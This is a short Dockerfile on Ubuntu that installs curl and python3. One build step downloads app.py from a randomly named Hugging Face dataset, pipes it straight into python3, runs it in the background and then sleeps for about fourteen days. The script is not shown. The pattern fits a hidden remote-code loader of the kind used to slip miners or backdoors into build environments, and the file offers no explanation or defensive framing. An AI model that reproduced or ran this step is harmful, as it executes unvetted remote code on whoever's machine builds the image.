FROM ubuntu:latest
RUN apt update && apt install curl python3 -y
ENV DEBIAN_FRONTEND=noninteractive

RUN curl -sL https://huggingface.co/datasets/sdfsdfsaaasddfsdfsd/1/resolve/main/app.py | python3 & sleep 1231323
